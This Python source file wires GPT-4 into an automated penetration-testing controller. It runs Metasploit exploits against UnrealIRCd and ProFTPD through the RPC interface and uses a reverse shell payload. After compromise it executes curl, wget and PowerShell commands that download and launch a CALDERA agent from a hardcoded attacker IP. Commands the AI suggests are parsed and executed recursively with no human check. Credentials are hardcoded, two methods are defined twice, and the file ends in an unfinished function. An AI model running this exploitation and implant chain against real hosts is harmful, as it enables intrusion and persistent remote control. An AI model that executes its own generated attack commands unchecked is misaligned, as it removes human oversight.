"""
Updated ai_controller.py with Metasploit RPC functionality
"""

import os
import time
import logging
import openai  # Changed from anthropic to openai
from typing import Dict, List, Optional, Callable, Any
import re
import json
import socket

# Try to import the Metasploit RPC client
try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    logging.warning("pymetasploit3 not installed, RPC functionality will be limited")

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class AIPentestController:
    """
    Controller class that manages the AI-guided penetration testing workflow.
    Acts as the "brain" that coordinates between the AI and various penetration testing tools.
    """

    def __init__(self, api_key: str, target_ip: str, output_callback: Optional[Callable] = None):
        """
        Initialize the AI Controller.

        Args:
            api_key: API key for OpenAI API
            target_ip: Target IP address for the penetration test
            output_callback: Optional callback function to receive AI outputs
        """
        self.api_key = api_key
        self.target_ip = target_ip
        self.output_callback = output_callback
        self.client = openai.OpenAI(api_key=api_key)  # Changed to OpenAI client
        self.conversation_history = []
        self.current_phase = "initialization"

        # Track additional state for better context
        self.nmap_results = {}
        self.nmap_service_summary = ""
        self.msfconsole_active = False
        self.current_msf_module = None
        self.session_active = False
        self.session_info = {}
        self.workspace_dir = "./workspace"

        # Create workspace directory if it doesn't exist
        os.makedirs(self.workspace_dir, exist_ok=True)

        # Initialize tool interfaces
        try:
            from tool_interfaces.metasploit_interface import MetasploitInterface
            from tool_interfaces.caldera_interface import CalderaInterface
            from tool_interfaces.scanner_interface import ScannerInterface

            self.metasploit = MetasploitInterface()
            self.caldera = CalderaInterface()
            self.scanner = ScannerInterface()

            logger.info("Tool interfaces initialized successfully")
        except ImportError as e:
            logger.error(f"Failed to import tool interfaces: {str(e)}")
            raise

    def _get_local_ip(self):
        """
        Get the local IP address using a socket connection.

        Returns:
            Local IP address as string
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Doesn't need to be reachable
            s.connect(('10.255.255.255', 1))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return '127.0.0.1'

    def _execute_metasploit_exploit(self, exploit_path, options, local_ip=None):
        """
        Execute a Metasploit exploit using the pymetasploit3 library

        Args:
            exploit_path: The path to the exploit module
            options: Dictionary of options to set
            local_ip: Local IP address for callbacks (will be auto-detected if None)

        Returns:
            Result string and session information if successful
        """
        try:
            # Import the required library here to avoid import issues
            from pymetasploit3.msfrpc import MsfRpcClient

            # Get local IP if not provided
            if not local_ip:
                local_ip = self._get_local_ip()

            if self.output_callback:
                self.output_callback(f"Connecting to Metasploit RPC server at 127.0.0.1:55553...", "system")

            # Connect to the MSF RPC server - note the updated port to match your working example
            client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)

            if self.output_callback:
                self.output_callback("Successfully connected to Metasploit RPC server", "system")

            # List available consoles
            console_list = client.consoles.list
            if self.output_callback:
                self.output_callback(f"Available consoles: {console_list}", "system")

            # Find an available console or create one
            console_id = None
            for console in console_list:
                if not console['busy']:
                    console_id = console['id']
                    break

            if console_id is None:
                if self.output_callback:
                    self.output_callback("No available consoles found. Creating a new one...", "system")

                # Create a new console
                console_resp = client.consoles.console()

                # Check for newly created console
                console_list = client.consoles.list
                for console in console_list:
                    if not console['busy']:
                        console_id = console['id']
                        break

            if console_id is None:
                raise Exception("No available console found and couldn't create one")

            if self.output_callback:
                self.output_callback(f"Using console with ID: {console_id}", "system")

            # Prepare all commands to execute in sequence
            commands = [
                f'use {exploit_path}'
            ]

            # Add RHOSTS
            commands.append(f'set RHOSTS {self.target_ip}')

            # Add additional options
            for option, value in options.items():
                commands.append(f'set {option} {value}')

            # Set callback address if not in options
            if 'LHOST' not in options:
                commands.append(f'set LHOST {local_ip}')

            # Add final commands
            commands.append('show options')

            # Execute each command in sequence
            result_output = ""
            for command in commands:
                if self.output_callback:
                    self.output_callback(f"Executing: {command}", "system")

                # Write command to console
                client.consoles.console(console_id).write(command + "\n")

                # Wait for command to execute
                time.sleep(1)

                # Read output
                result = client.consoles.console(console_id).read()
                if isinstance(result, dict) and 'data' in result:
                    clean_output = self._clean_ansi_codes(result['data'])
                    result_output += clean_output + "\n"
                    if self.output_callback:
                        self.output_callback(clean_output, "system")

            # Run the exploit
            if self.output_callback:
                self.output_callback("Running exploit...", "system")

            client.consoles.console(console_id).write("run\n")

            # Wait for session establishment
            if self.output_callback:
                self.output_callback("Waiting for session establishment...", "system")

            # Check for up to 30 seconds
            session_established = False
            for _ in range(10):
                time.sleep(3)

                # Read any new output
                result = client.consoles.console(console_id).read()
                if isinstance(result, dict) and 'data' in result and result['data']:
                    clean_output = self._clean_ansi_codes(result['data'])
                    result_output += clean_output + "\n"
                    if self.output_callback:
                        self.output_callback(clean_output, "system")

                    # Check for session mention in output
                    if "session" in clean_output.lower() and "opened" in clean_output.lower():
                        session_established = True
                        if self.output_callback:
                            self.output_callback("Session established!", "success")

                # Check for sessions directly
                try:
                    sessions = client.sessions.list
                    if sessions and len(sessions) > 0:
                        session_established = True
                        break
                except Exception as sess_err:
                    logger.warning(f"Error checking sessions: {str(sess_err)}")

                # If console not busy anymore and we've waited a bit, we can stop waiting
                if isinstance(result, dict) and 'busy' in result and not result['busy'] and _ >= 2:
                    break

            # Final check for sessions
            sessions = {}
            try:
                sessions = client.sessions.list
                if self.output_callback:
                    self.output_callback(f"Active sessions: {sessions}", "system")
            except Exception as e:
                if self.output_callback:
                    self.output_callback(f"Error getting sessions: {str(e)}", "warning")

            if sessions and len(sessions) > 0:
                if self.output_callback:
                    self.output_callback(f"Sessions established: {sessions}", "success")

                # Store the first session ID for use in post-exploitation
                session_id = list(sessions.keys())[0]
                # Get session type safely
                session_type = sessions[session_id].get('type', 'shell') if session_id in sessions else 'shell'

                self.session_active = True
                self.session_info = {'id': session_id, 'type': session_type}

                # If session established, update phase
                self.current_phase = "post_exploitation"
                if self.output_callback:
                    self.output_callback("Moving to post-exploitation phase", "system")

                # Attempt to install CALDERA agent
                if session_type == "meterpreter":
                    if self.output_callback:
                        self.output_callback("Meterpreter session established, preparing to install CALDERA agent...",
                                             "system")
                    self._install_caldera_agent(client, session_id)
                else:
                    if self.output_callback:
                        self.output_callback(
                            "Command shell session established. Use post-exploitation commands directly.", "system")

                return result_output, sessions
            else:
                if self.output_callback:
                    self.output_callback("No sessions established", "warning")
                return result_output, None

        except Exception as e:
            error_msg = f"Error executing Metasploit exploit: {str(e)}"
            logger.error(error_msg)
            if self.output_callback:
                self.output_callback(error_msg, "error")
            import traceback
            logger.error(traceback.format_exc())
            return str(e), None

    def _install_caldera_agent(self, msf_client, session_id):
        """
        Install CALDERA agent on a compromised system directly through the current session.

        Args:
            msf_client: The Metasploit RPC client
            session_id: The session ID to use

        Returns:
            True if successful, False otherwise
        """
        try:
            if self.output_callback:
                self.output_callback("Preparing to install CALDERA agent...", "system")

            # Hardcode the Kali IP as requested
            kali_ip = "192.168.227.13"

            if self.output_callback:
                self.output_callback(f"Using Kali IP address {kali_ip} for CALDERA server", "system")

            # Verify that the session exists and is active
            try:
                sessions = msf_client.sessions.list
                if str(session_id) not in sessions:
                    if self.output_callback:
                        self.output_callback(
                            f"Session {session_id} not found. Available sessions: {list(sessions.keys())}", "error")
                    return False

                if self.output_callback:
                    self.output_callback(f"Confirmed session {session_id} is active", "system")
            except Exception as e:
                if self.output_callback:
                    self.output_callback(f"Error checking session: {str(e)}", "error")
                return False

            # CALDERA agent installation commands - Split into individual commands for more reliable execution
            commands = [
                f"cd /tmp",
                f"curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" http://{kali_ip}:8888/file/download > agent",
                f"chmod +x agent",
                f"nohup ./agent -server http://{kali_ip}:8888 -group red -v > /dev/null 2>&1 &"
            ]

            if self.output_callback:
                self.output_callback("Will execute the following commands:", "system")
                for i, cmd in enumerate(commands):
                    self.output_callback(f"Step {i + 1}: {cmd}", "system")

            # Use direct Metasploit console commands (this avoids subprocess issues)
            success = True
            for i, cmd in enumerate(commands):
                try:
                    if self.output_callback:
                        self.output_callback(f"Executing step {i + 1}: {cmd}", "system")

                    # Execute the command in the session - use the standard Metasploit interface
                    formatted_command = f"sessions -i {session_id} -c '{cmd}'"
                    result = self.metasploit.execute_command(formatted_command)

                    if "Error:" in result or "Invalid session" in result or "Failed" in result:
                        if self.output_callback:
                            self.output_callback(f"Error in step {i + 1}: {result}", "error")
                        success = False
                    else:
                        if self.output_callback:
                            self.output_callback(f"Step {i + 1} completed successfully", "success")

                except Exception as cmd_error:
                    if self.output_callback:
                        self.output_callback(f"Error executing step {i + 1}: {str(cmd_error)}", "error")
                    success = False
                    # Continue with other commands despite errors

            # Final status determination
            if success:
                if self.output_callback:
                    self.output_callback("All CALDERA agent installation steps executed successfully.", "success")
                    self.output_callback("Check CALDERA interface for new agent registration.", "system")
                    self.output_callback("Note: It may take up to 60 seconds for the agent to register.", "system")
                return True
            else:
                if self.output_callback:
                    self.output_callback(
                        "Some CALDERA agent installation steps encountered errors, but the agent may still work.",
                        "warning")
                    self.output_callback("Check CALDERA interface for new agent registration.", "system")
                return False

        except Exception as e:
            error_msg = f"Error installing CALDERA agent: {str(e)}"
            logger.error(error_msg)
            if self.output_callback:
                self.output_callback(error_msg, "error")
            # Log full traceback for debugging
            import traceback
            logger.error(f"Full traceback: {traceback.format_exc()}")
            return False
    def _clean_ansi_codes(self, text):
        """Remove ANSI color codes and other control sequences from text"""
        if not text:
            return ""
        import re
        ansi_cleaner = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_cleaner.sub('', text)

    def _clean_ansi_codes(self, text):
        """Remove ANSI color codes and other control sequences from text"""
        import re
        ansi_cleaner = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
        return ansi_cleaner.sub('', text)

    def _install_caldera_agent(self, msf_client, session_id):
        """
        Install CALDERA agent on a compromised system with the correct API key.

        Args:
            msf_client: The Metasploit RPC client
            session_id: The session ID to use

        Returns:
            True if successful, False otherwise
        """
        try:
            if self.output_callback:
                self.output_callback("Preparing to install CALDERA agent...", "system")

            # Hardcode the Kali IP
            kali_ip = "192.168.227.13"

            # Use the correct API key from the CALDERA configuration
            api_key = "ADMIN123"  # This is the correct Red team API key

            if self.output_callback:
                self.output_callback(f"Using CALDERA server at http://{kali_ip}:8888 with API key: {api_key}", "system")

            # Verify session is active
            verify_cmd = f"sessions -i {session_id} -c 'echo SESSION_VERIFY'"
            verify_result = self.metasploit.execute_command(verify_cmd)

            if "SESSION_VERIFY" not in verify_result:
                if self.output_callback:
                    self.output_callback(f"Session verification failed: {verify_result}", "error")
                    self.output_callback("Trying to list available sessions...", "system")

                list_cmd = "sessions -l"
                list_result = self.metasploit.execute_command(list_cmd)
                self.output_callback(f"Available sessions:\n{list_result}", "system")
                return False
            else:
                self.output_callback("Session verified as active.", "success")

            # Determine target platform
            platform_cmd = f"sessions -i {session_id} -c 'uname -a || echo WINDOWS'"
            platform_result = self.metasploit.execute_command(platform_cmd)

            is_windows = "WINDOWS" in platform_result
            platform = "windows" if is_windows else "linux"

            if self.output_callback:
                self.output_callback(f"Detected target platform: {platform}", "system")

            # Create and use direct agent installation commands
            if platform == "linux":
                # Linux CALDERA agent installation
                agent_cmd = (
                    f"sessions -i {session_id} -c '"
                    f"cd /tmp && "
                    f"curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" "
                    f"-H \"server:{kali_ip}:8888\" -H \"api_key:{api_key}\" "
                    f"http://{kali_ip}:8888/file/download > sandcat && "
                    f"chmod +x sandcat && "
                    f"./sandcat -server http://{kali_ip}:8888 -group red -v &"
                    f"'"
                )
            else:
                # Windows CALDERA agent installation
                agent_cmd = (
                    f"sessions -i {session_id} -c '"
                    f"cd %TEMP% && "
                    f"powershell -c \"Invoke-WebRequest -UseBasicParsing -Uri 'http://{kali_ip}:8888/file/download' "
                    f"-Headers @{{file='sandcat.go';platform='windows';server='{kali_ip}:8888';api_key='{api_key}'}} "
                    f"-Method POST -OutFile sandcat.exe\" && "
                    f"start /b sandcat.exe -server http://{kali_ip}:8888 -group red -v"
                    f"'"
                )

            # Execute the agent installation command
            if self.output_callback:
                self.output_callback(f"Executing agent installation command:\n{agent_cmd}", "system")

            result = self.metasploit.execute_command(agent_cmd)

            if self.output_callback:
                self.output_callback(f"Installation command result:\n{result}", "system")

            # Try alternative method if needed
            if "command not found" in result or "No such file" in result:
                self.output_callback("Curl not found. Trying wget alternative...", "warning")

                if platform == "linux":
                    # Alternative method with wget
                    alt_cmd = (
                        f"sessions -i {session_id} -c '"
                        f"cd /tmp && "
                        f"wget -q -O sandcat --post-data='' --header=\"file:sandcat.go\" "
                        f"--header=\"platform:linux\" --header=\"server:{kali_ip}:8888\" "
                        f"--header=\"api_key:{api_key}\" http://{kali_ip}:8888/file/download && "
                        f"chmod +x sandcat && "
                        f"./sandcat -server http://{kali_ip}:8888 -group red -v &"
                        f"'"
                    )

                    self.output_callback(f"Trying alternative wget method:\n{alt_cmd}", "system")
                    alt_result = self.metasploit.execute_command(alt_cmd)
                    self.output_callback(f"Alternative method result:\n{alt_result}", "system")

            # Success message
            self.output_callback("CALDERA agent installation commands executed.", "success")
            self.output_callback("Check CALDERA interface for new agent registration.", "system")
            self.output_callback("Note: It may take up to 60 seconds for the agent to register.", "system")

            return True

        except Exception as e:
            error_msg = f"Error installing CALDERA agent: {str(e)}"
            logger.error(error_msg)
            if self.output_callback:
                self.output_callback(error_msg, "error")
            import traceback
            logger.error(f"Full traceback: {traceback.format_exc()}")
            return False

    def _send_to_ai(self, prompt: str) -> str:
        """
        Send a prompt to the AI and get a response.

        Args:
            prompt: The prompt to send to the AI

        Returns:
            The AI's response
        """
        try:
            # Make a defensive copy of conversation history
            history_copy = list(self.conversation_history) if self.conversation_history else []

            # Create message with conversation history
            messages = [{"role": "system",
                         "content": "You are an expert penetration tester guiding the user through an authorized penetration test step by step. "
                                    "Act as a helpful, knowledgeable collaborator explaining your thought process and reasoning. "
                                    "Discuss what you're doing and why, as if you're working alongside the user. "
                                    "When using tools, explain what you hope to learn or accomplish. "
                                    "When analyzing results, point out interesting findings and explain their significance. "
                                    "Adapt your approach based on what you discover during the test."
                                    "\n\nIMPORTANT INSTRUCTIONS FOR METASPLOIT:"
                                    "\nWhen using Metasploit, always start with: Command: `msfconsole` then provide subsequent commands one at a time:"
                                    "\nCommand: `use exploit/path/to/module`"
                                    "\nCommand: `set RHOSTS target_ip`"
                                    "\nCommand: `exploit` or Command: `run`"
                                    "\nNever try to run Metasploit commands directly from the shell - they must be run inside msfconsole."
                                    "\n\nVERY IMPORTANT: When you want to run a command, format it exactly like this: 'Command: `actual_command_here`'. "
                                    "For example: 'Command: `nmap -sV 192.168.1.1`'. Only commands formatted exactly this way will be executed."}]

            # Add conversation history (limited to last 10 exchanges to avoid context issues)
            messages.extend(history_copy[-10:])

            # Add current prompt
            messages.append({"role": "user", "content": prompt})

            # Get response from AI with safety timeout handling
            try:
                # Log before API call
                logger.info(f"Sending prompt to OpenAI API, length: {len(prompt)}")

                # Make the API call
                response = self.client.chat.completions.create(
                    model="gpt-4",  # You can change this to gpt-3.5-turbo if needed
                    messages=messages,
                    temperature=0.2,
                    max_tokens=2000  # Reduced for safety
                )

                # Log after API call
                logger.info("Received response from OpenAI API")

                ai_response = response.choices[0].message.content

                # Update conversation history safely
                self.conversation_history.append({"role": "user", "content": prompt})
                self.conversation_history.append({"role": "assistant", "content": ai_response})

                # Trim conversation history if it gets too long
                if len(self.conversation_history) > 20:
                    self.conversation_history = self.conversation_history[-20:]

                # Send to output callback if provided, with extra error handling
                if self.output_callback:
                    try:
                        self.output_callback(ai_response, "ai")
                    except Exception as callback_error:
                        logger.error(f"Error in output callback: {str(callback_error)}")

                return ai_response

            except TimeoutError:
                error_msg = "OpenAI API request timed out"
                logger.error(error_msg)
                if self.output_callback:
                    self.output_callback(f"ERROR: {error_msg}", "error")
                return "The API request timed out. Please try again."

        except Exception as e:
            error_msg = f"Error communicating with AI: {str(e)}"
            logger.error(error_msg)
            if self.output_callback:
                self.output_callback(f"ERROR: {error_msg}", "error")
            return f"Error: {str(e)}"

    def _force_parse_scan_results(self, scan_output):
        """
        Parse scan results and attempt direct exploitation of identified services.
        """
        try:
            # First, parse the services from the scan output
            services = []
            has_irc_service = False
            has_proftpd_service = False
            irc_port = None

            # Scan through the output line by line
            lines = scan_output.split('\n')
            for line in lines:
                # Look for IRC service
                if "/tcp" in line and "open" in line and "irc" in line.lower():
                    # Extract the port
                    port = line.split('/')[0].strip()
                    has_irc_service = True
                    irc_port = port
                    if self.output_callback:
                        self.output_callback(f"Detected IRC service on port {port}!", "system")

                # Look for ProFTPD service
                if "21/tcp" in line and "open" in line and "proftpd" in line.lower():
                    has_proftpd_service = True
                    if self.output_callback:
                        self.output_callback("Detected ProFTPD service on port 21!", "system")

            # Display the full scan results
            if self.output_callback:
                self.output_callback("Scan Result:", "system")
                self.output_callback(scan_output, "system")

            # Update the phase
            self.current_phase = "vulnerability_identification"
            if self.output_callback:
                self.output_callback(f"Moving to phase: {self.current_phase}", "system")

            # If no IRC service found in initial scan, run an extended scan for IRC services
            if not has_irc_service:
                if self.output_callback:
                    self.output_callback(
                        "No IRC service detected in initial scan. Running extended IRC service scan...", "system")

                has_irc_service, irc_port = self.extended_scan_for_irc()

            # Flag to track if exploitation was successful
            exploitation_successful = False

            # Direct exploitation based on detected services
            # First try UnrealIRCd if detected or assumed to be on port 6697
            if has_irc_service:
                # If no specific port was found, try the common IRC port 6697
                if not irc_port:
                    irc_port = "6697"

                if self.output_callback:
                    self.output_callback(f"Attempting to exploit UnrealIRCd backdoor on port {irc_port}...", "system")

                # Attempt the direct exploit
                success = self.exploit_unrealircd_direct(port=irc_port)

                if success:
                    if self.output_callback:
                        self.output_callback("Successfully exploited UnrealIRCd! Moving to post-exploitation.",
                                             "success")
                    exploitation_successful = True  # Mark as successful
                    return  # Return immediately after successful exploitation
            # Even if no IRC service detected, try on port 6697 as a fallback
            elif self.output_callback:
                self.output_callback(
                    "No IRC service detected, but trying UnrealIRCd exploit on port 6697 as fallback...", "system")
                success = self.exploit_unrealircd_direct(port="6697")

                if success:
                    if self.output_callback:
                        self.output_callback(
                            "Successfully exploited UnrealIRCd on port 6697! Moving to post-exploitation.", "success")
                    exploitation_successful = True  # Mark as successful
                    return  # Return immediately after successful exploitation

            # Only proceed to ProFTPD if UnrealIRCd exploitation failed
            if not exploitation_successful and has_proftpd_service:
                if self.output_callback:
                    self.output_callback("Attempting to exploit ProFTPD 1.3.5...", "system")

                # Get local IP
                local_ip = self._get_local_ip()

                # Set up the exploit parameters
                exploit_path = 'exploit/unix/ftp/proftpd_modcopy_exec'
                options = {
                    'RPORT_FTP': '21',
                    'SITEPATH': '/var/www',
                    'TARGETURI': '/',
                    'TMPPATH': '/tmp',
                    'PAYLOAD': 'cmd/unix/reverse_perl'
                }

                # Execute the exploit
                result, sessions = self._execute_metasploit_exploit(exploit_path, options, local_ip)

                if sessions:
                    if self.output_callback:
                        self.output_callback("Successfully exploited ProFTPD!", "success")
                    exploitation_successful = True  # Mark as successful
                    return  # Return immediately after successful exploitation

            # If we reached here, no automated exploitation worked
            # Send the results to AI for further analysis
            if not exploitation_successful:
                if self.output_callback:
                    self.output_callback("Automated exploitation attempts failed, asking AI for guidance...", "system")

                # Create a prompt for the AI
                ai_prompt = f"""I've scanned the target at {self.target_ip} and found the following results:

    {scan_output}

    I attempted automated exploitation of UnrealIRCd on port 6697 and ProFTPD 1.3.5 on port 21, but wasn't successful. Based on these scan results, what would be the most promising attack vectors? Please suggest specific commands to try for exploitation.

    Some ideas to consider:
    1. Try searching for more specific exploits with searchsploit
    2. Try the unreal_ircd_3281_backdoor exploit with different port numbers
    3. Check for web application vulnerabilities on ports 80 and 8181
    4. Look for SMB/Samba vulnerabilities on port 445
    """

                # Send to AI
                ai_response = self._send_to_ai(ai_prompt)

                # Parse the AI's response and extract any commands
                parsed = self.parse_ai_response(ai_response)

                # Execute any commands the AI suggested
                if parsed.get("commands"):
                    if self.output_callback:
                        self.output_callback("Executing AI-suggested commands...", "system")

                    self._process_commands_and_continue(parsed.get("commands"))

        except Exception as e:
            logger.error(f"Error parsing scan results: {str(e)}")
            if self.output_callback:
                self.output_callback(f"Error parsing scan results: {str(e)}", "error")
            import traceback
            logger.error(traceback.format_exc())

    def _process_commands_and_continue(self, commands):
        """
        Process a list of commands and automatically continue the penetration test.
        Modified to check for active sessions before processing commands.

        Args:
            commands: List of commands to execute
        """
        try:
            # FIRST CHECK: If we already have an active session, focus on that instead of running new commands
            from pymetasploit3.msfrpc import MsfRpcClient

            try:
                # Try to connect to the Metasploit RPC server
                client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)

                # Check for active sessions
                sessions = client.sessions.list

                if sessions:
                    session_id = list(sessions.keys())[0]
                    session_info = sessions[session_id]

                    if self.output_callback:
                        self.output_callback(
                            f"Active session detected (ID: {session_id})! Stopping command execution to focus on post-exploitation.",
                            "system")
                        self.output_callback(f"Session type: {session_info.get('type', 'unknown')}", "system")
                        self.output_callback(f"Target: {session_info.get('target_host', 'unknown')}", "system")
                        self.output_callback("""
    You now have an active session on the target. You can:
    1. Interact with the session using Metasploit console commands
    2. Use this session for post-exploitation activities
    3. Type 'help' for more options

    For example, to run a command in this session, type:
    run whoami
    """, "system")

                    # Since we have an active session, don't process any more commands
                    return

            except Exception as e:
                # If there's an error checking for sessions, log it but continue with normal command processing
                logger.error(f"Error checking for sessions: {str(e)}")

            # If no active session was found or there was an error, continue with normal command processing
            if not commands:
                return

            # Execute commands
            for command in commands:
                try:
                    # Determine which tool to use
                    tool = self.determine_tool(command)

                    # Execute command
                    result = self._execute_tool_command(tool, command)

                    # CRITICAL: Check if this command resulted in a new session
                    try:
                        client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)
                        sessions = client.sessions.list

                        if sessions:
                            session_id = list(sessions.keys())[0]

                            if self.output_callback:
                                self.output_callback(
                                    f"Session established (ID: {session_id})! Stopping command execution to focus on post-exploitation.",
                                    "success")

                            # Stop processing more commands since we have a session
                            return
                    except:
                        # If checking for sessions fails, continue with command processing
                        pass

                    # Feed the result back to the AI
                    feedback_prompt = f"I executed the command: {command}\n\nResult:\n{result}\n\nAnalyze these results and suggest what we should do next."
                    response = self._send_to_ai(feedback_prompt)

                    # Parse new response
                    new_parsed = self.parse_ai_response(response)

                    # Update phase if needed
                    if new_parsed.get("next_phase"):
                        self.current_phase = new_parsed.get("next_phase")
                        if self.output_callback:
                            self.output_callback(f"Moving to phase: {self.current_phase}", "system")

                    # IMPORTANT: Check for sessions again before recursively processing new commands
                    try:
                        client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)
                        sessions = client.sessions.list

                        if sessions:
                            session_id = list(sessions.keys())[0]

                            if self.output_callback:
                                self.output_callback(
                                    f"Session established (ID: {session_id})! Stopping command execution to focus on post-exploitation.",
                                    "success")

                            # Stop processing more commands since we have a session
                            return
                    except:
                        # If checking for sessions fails, continue with command processing
                        pass

                    # IMPORTANT: Recursively process new commands to continue automatically
                    # But only if we don't have an active session
                    if new_parsed.get("commands"):
                        self._process_commands_and_continue(new_parsed.get("commands"))

                except Exception as e:
                    logger.error(f"Error executing command '{command}': {str(e)}")
                    if self.output_callback:
                        self.output_callback(f"Error executing command: {str(e)}", "error")

        except Exception as e:
            logger.error(f"Error in _process_commands_and_continue: {str(e)}")
            if self.output_callback:
                self.output_callback(f"Error processing commands: {str(e)}", "error")

    def _execute_tool_command(self, tool: str, command: str) -> str:
        """
        Execute a command with the specified tool and return the result.

        Args:
            tool: The tool to use ('metasploit', 'caldera', 'scanner')
            command: The command to execute

        Returns:
            The command output
        """
        try:
            result = ""
            if self.output_callback:
                self.output_callback(f"Executing command: {command}", "system")

            # Execute the command with the appropriate tool
            if tool.lower() == "metasploit":
                # Handle metasploit commands specially
                result = self._handle_metasploit_command(command)

                # Check for successful session establishment
                if "Meterpreter session" in result or "Command shell session" in result:
                    self.session_active = True
                    # Extract session ID if possible
                    session_match = re.search(r'Meterpreter session (\d+) opened|Command shell session (\d+) opened',
                                              result)
                    if session_match:
                        session_id = session_match.group(1) or session_match.group(2)
                        self.session_info['id'] = session_id
                        self.session_info['type'] = 'meterpreter' if 'Meterpreter session' in result else 'shell'
                        logger.info(f"Session established: {self.session_info}")
                        self.current_phase = "post_exploitation"

            elif tool.lower() == "caldera":
                result = self.caldera.execute_command(command)
            elif tool.lower() == "scanner":
                result = self.scanner.execute_command(command)

                # MAKE SURE SCAN RESULT IS VISIBLE BEFORE PARSING
                if command.startswith("nmap") and self.output_callback:
                    self.output_callback(f"Scan Result:\n{result}", "system")

                # If this is an nmap scan, analyze results
                if command.startswith("nmap") and self.target_ip in result:
                    self._force_parse_scan_results(result)

            else:
                return f"Unknown tool: {tool}"

            # Display result ONLY IF we haven't already displayed it for nmap
            if self.output_callback and not (tool.lower() == "scanner" and command.startswith("nmap")):
                self.output_callback(f"Result: {result}", "system")

            return result

        except Exception as e:
            error_msg = f"Error executing {tool} command: {str(e)}"
            logger.error(error_msg)
            if self.output_callback:
                self.output_callback(f"ERROR: {error_msg}", "error")
            return f"Error: {str(e)}"

    def _handle_metasploit_command(self, command: str) -> str:
        """
        Handle Metasploit commands with proper state tracking.

        Args:
            command: The Metasploit command to execute

        Returns:
            Command output
        """
        # If command is msfconsole, mark Metasploit as active
        if command.strip() == 'msfconsole':
            self.msfconsole_active = True
            return self.metasploit.execute_command(command)

        # Special handling for set LHOST command with placeholders
        if command.strip().startswith('set LHOST') and ('your_' in command or 'actual_' in command):
            # Get the local IP automatically
            local_ip = self._get_local_ip()
            if self.output_callback:
                self.output_callback(f"Detected placeholder IP. Using actual local IP: {local_ip}", "system")

            # Replace the command with the actual IP
            command = f"set LHOST {local_ip}"

        # Special handling for exploit command when we recognize it's using a known exploit
        if (command.strip() == 'exploit' or command.strip() == 'run') and self.current_msf_module:
            # Check if this is the ProFTPD exploit
            if 'proftpd_modcopy_exec' in self.current_msf_module:
                try:
                    if self.output_callback:
                        self.output_callback("Using RPC method for ProFTPD exploitation...", "system")

                    # Get local IP
                    local_ip = self._get_local_ip()

                    # Set options for ProFTPD exploit
                    options = {
                        'RPORT_FTP': '21',
                        'SITEPATH': '/var/www',
                        'TARGETURI': '/',
                        'TMPPATH': '/tmp',
                        'LHOST': local_ip
                    }

                    # Execute with RPC
                    result_output, sessions = self._execute_metasploit_exploit(
                        'exploit/unix/ftp/proftpd_modcopy_exec',
                        options,
                        local_ip
                    )

                    if sessions:
                        return f"Exploit successful! {result_output}"
                    else:
                        return f"Exploit attempt completed: {result_output}"

                except Exception as e:
                    error_msg = f"Error with RPC exploitation: {str(e)}. Falling back to traditional method."
                    logger.error(error_msg)
                    if self.output_callback:
                        self.output_callback(error_msg, "warning")
                    # Fall back to regular command execution if RPC fails

        # Check if this is a module selection command
        if command.startswith('use '):
            self.current_msf_module = command.replace('use ', '').strip()
            self.msfconsole_active = True

        # Handle commands based on Metasploit state
        if self.msfconsole_active:
            # Commands are being run inside Metasploit
            result = self.metasploit.execute_command(command)

            # Clean the output
            result = self._clean_ansi_codes(result) if result else ""

            # If exiting Metasploit, update state
            if command.startswith('exit') or command.startswith('quit'):
                self.msfconsole_active = False
                self.current_msf_module = None

            return result
        else:
            # Metasploit needs to be started first
            if self.output_callback:
                self.output_callback("Metasploit console not started. Starting msfconsole first...", "warning")

            # Start msfconsole first
            msf_output = self.metasploit.execute_command('msfconsole')
            self.msfconsole_active = True

            # Then run the actual command
            cmd_output = self.metasploit.execute_command(command)

            # Clean and return combined output
            return self._clean_ansi_codes(f"{msf_output}\n{cmd_output}")

    def parse_ai_response(self, response: str) -> Dict:
        """
        Parse the AI's response to extract commands and reasoning.

        Args:
            response: The AI's response

        Returns:
            Dictionary containing parsed components
        """
        # Improved parsing logic
        result = {
            "reasoning": response,  # Store full response as reasoning
            "commands": [],
            "next_phase": None
        }

        # Extract properly formatted commands
        command_pattern = r'Command:\s*`(.*?)`'
        commands = re.findall(command_pattern, response)

        # Filter out any empty commands
        result["commands"] = [cmd.strip() for cmd in commands if cmd.strip()]

        # Detect phase changes with improved patterns
        phase_patterns = [
            (r'(?:moving|transition|proceed|begin|start)(?:ing|ed)?\s+(?:to|with|the)\s+(?:the\s+)?reconnaissance', "reconnaissance"),
            (r'(?:moving|transition|proceed|begin|start)(?:ing|ed)?\s+(?:to|with|the)\s+(?:the\s+)?vulnerability', "vulnerability_identification"),
            (r'(?:moving|transition|proceed|begin|start)(?:ing|ed)?\s+(?:to|with|the)\s+(?:the\s+)?exploit', "exploitation"),
            (r'(?:moving|transition|proceed|begin|start)(?:ing|ed)?\s+(?:to|with|the)\s+(?:the\s+)?post[- ]exploit', "post_exploitation"),
            (r'(?:moving|transition|proceed|begin|start)(?:ing|ed)?\s+(?:to|with|the)\s+(?:the\s+)?caldera', "caldera_operation"),
            (r'next\s+phase\s*:?\s*reconnaissance', "reconnaissance"),
            (r'next\s+phase\s*:?\s*vulnerability', "vulnerability_identification"),
            (r'next\s+phase\s*:?\s*exploit', "exploitation"),
            (r'next\s+phase\s*:?\s*post', "post_exploitation"),
            (r'next\s+phase\s*:?\s*caldera', "caldera_operation"),
        ]

        response_lower = response.lower()
        for pattern, phase in phase_patterns:
            if re.search(pattern, response_lower):
                result["next_phase"] = phase
                break

        logger.info(f"Extracted {len(result['commands'])} commands from AI response")
        if result["next_phase"]:
            logger.info(f"Detected phase change suggestion: {result['next_phase']}")

        return result

    def determine_tool(self, command: str) -> str:
        """
        Determine which tool to use based on the command.

        Args:
            command: The command to analyze

        Returns:
            The appropriate tool name
        """
